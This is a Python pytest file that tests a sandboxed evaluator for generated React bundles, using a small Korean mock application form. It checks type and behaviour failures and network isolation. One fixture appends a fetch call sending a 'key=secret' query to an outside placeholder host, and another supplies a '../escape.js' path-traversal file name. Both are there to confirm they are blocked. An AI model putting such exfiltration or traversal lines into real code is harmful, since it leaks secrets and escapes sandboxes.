import base64
import json
import os
import subprocess
from pathlib import Path

import pytest

from workspace.browser import evaluate_bundle
from workspace.react_runtime import evaluate_react

ROOT = Path(__file__).resolve().parents[1]
APP = """import {useState} from 'react';
import {Screen,Stack,Text,Input,Checkbox,Button} from '@studio/approved-ui';
export default function App(){
 const [amount,setAmount]=useState('300000'),[agreed,setAgreed]=useState(false),[done,setDone]=useState(false);
 return <Screen pageId="entry"><Stack><Text as="h1">모의 신청</Text>
 {done ? <Text testId="summary">{Number(amount).toLocaleString('ko-KR')}원</Text> :
 <><Input testId="amount" label="금액" value={amount} onChange={setAmount}/>
 <Checkbox testId="agree" label="필수 동의" checked={agreed} onChange={setAgreed}/></>}
 <Button testId="next" kind="primary" label="다음" disabled={!agreed} onClick={()=>setDone(true)}/>
 </Stack></Screen>;
}"""
CONTRACT = {"title": "React 실제 컴포넌트 확인", "viewport": {"width": 390, "height": 844}, "rules": [
    {"id": "R1", "title": "동의와 값 전달", "steps": [
        {"action": "expectEnabled", "target": "next", "value": False},
        {"action": "fill", "target": "amount", "value": "10000"},
        {"action": "check", "target": "agree", "value": True},
        {"action": "expectStyle", "target": "next", "property": "backgroundColor", "value": "#008485"},
        {"action": "click", "target": "next"},
        {"action": "expectText", "target": "summary", "value": "10,000원", "match": "equals"},
    ]}
]}


@pytest.fixture(autouse=True)
def local_chromium(monkeypatch):
    executable = "/home/atomoh/.cache/ms-playwright/chromium_headless_shell-1208/chrome-linux/headless_shell"
    if not os.environ.get("WORKSPACE_CHROMIUM_PATH") and Path(executable).is_file():
        monkeypatch.setenv("WORKSPACE_CHROMIUM_PATH", executable)


@pytest.fixture(scope="module")
def react_request():
    raw = subprocess.check_output(["node", "-e", "process.stdout.write(JSON.stringify(require('./manifest.cjs').catalog()))"],
                                  cwd=ROOT / "react-kit")
    descriptor = json.loads(raw)
    return {"kind": "react", "files": {"src/App.tsx": APP}, "assets": {},
            "catalogHash": descriptor["hash"], "contract": CONTRACT}


def test_real_react_build_and_browser_evidence(react_request):
    result = evaluate_react(react_request)
    assert result["passed"] and result["functionalStatus"] == "pass", result
    assert result["build"]["gates"]["types"]["status"] == "pass"
    assert result["build"]["gates"]["build"]["status"] == "pass"
    assert result["build"]["sourceHash"] and result["build"]["bundleHash"]
    assert result["accessibility"]["status"] == "pass"
    assert result["networkRequests"] == []
    assert "projectZipBase64" in result["build"] and "distZipBase64" in result["build"]
    assert "files" not in result["build"], "do not duplicate large bundle bytes in the Lambda response"


def test_wrong_props_never_fall_back_to_html(react_request):
    invalid = {**react_request, "files": {"src/App.tsx": APP.replace('kind="primary"', 'kind="invented"')}}
    result = evaluate_react(invalid)
    assert not result["passed"]
    assert result["build"]["gates"]["types"]["status"] == "fail"
    assert result["checks"] == []
    assert result["functionalStatus"] == "incomplete"
    assert not result.get("engineError"), "ordinary type failure must be repairable by the generator"


def test_required_behavior_failure_survives_successful_react_build(react_request):
    invalid = {**react_request, "files": {"src/App.tsx": APP.replace("Number(amount).toLocaleString", "Number(300000).toLocaleString")}}
    result = evaluate_react(invalid)
    assert result["build"]["gates"]["build"]["status"] == "pass"
    assert result["functionalStatus"] == "fail" and not result["passed"]
    assert result["checks"][0]["steps"][-1]["actual"] == "300,000원"


def test_only_exact_local_bundle_files_are_served():
    contract = {"title": "로컬 번들", "rules": [{"id": "R1", "title": "스크립트 동작", "steps": [
        {"action": "click", "target": "next"},
        {"action": "expectText", "target": "summary", "value": "완료"},
    ]}]}
    files = {
        "index.html": b'<!doctype html><html lang="ko"><head><title>Local bundle</title></head><body><main data-studio-component="Screen"><h1>Test</h1><button data-testid="next">Next</button><p data-testid="summary"></p></main><script src="./assets/app.js"></script></body></html>',
        "assets/app.js": b'document.querySelector("button").onclick=()=>document.querySelector("p").textContent="\\uC644\\uB8CC";',
    }
    assert evaluate_bundle(files, contract)["passed"]
    outside = {**files, "assets/app.js": files["assets/app.js"] + b'fetch("https://blocked.invalid/private?key=secret");'}
    result = evaluate_bundle(outside, contract)
    assert not result["passed"] and result["networkRequests"]
    assert not any("?key=" in request for request in result["networkRequests"])
    with pytest.raises(ValueError):
        evaluate_bundle({**files, "../escape.js": b""}, contract)
